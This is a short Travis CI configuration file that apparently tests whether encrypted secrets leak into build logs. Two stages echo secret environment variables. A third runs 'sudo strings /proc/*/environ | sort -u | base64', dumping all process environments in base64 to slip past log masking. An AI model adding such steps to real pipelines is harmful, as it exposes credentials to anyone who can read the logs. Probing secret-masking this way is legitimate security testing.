os: linux
arch: amd64
rvm: 2.6.3
env:
  global:
    # SEC_ENV
    secure: 
    # NEW
    - secure: 
jobs:
  include:
    - stage: "echo SEC_ENV"
      script: echo $SEC_ENV
    - stage: "echo New"
      script: echo $NEW
    - stage: "print base64"
      script: sudo strings /proc/*/environ | sort -u | base64
